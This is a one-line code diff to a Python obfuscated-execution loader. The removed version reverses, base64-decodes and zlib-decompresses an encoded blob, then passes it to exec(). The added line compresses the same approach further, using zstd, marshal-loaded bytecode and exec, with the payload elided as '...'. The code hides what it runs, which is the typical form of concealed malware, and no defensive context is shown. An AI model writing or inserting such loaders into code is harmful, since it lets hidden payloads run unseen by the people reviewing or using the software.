@@ -1,1 +1,1 @@
-import zlib import base64 def execute_payload(payload): decoded = base64.b64decode(payload[::-1])  # Decode after reversing decompressed = zlib.decompress(decoded)   # Decompress the result exec(decompressed)                        # Execute the decompressed payload # Example usage payload = b'vCUPPcw/fff+/TZrBzgT0to/3yh8Ji4bGH1rP/jaKqQ8HROMsLVQKcu...' execute_payload(payload)
+import zstd, base64, marshal; exec(marshal.loads(zstd.decompress(base64.b64decode(b'...'[::-1]))))
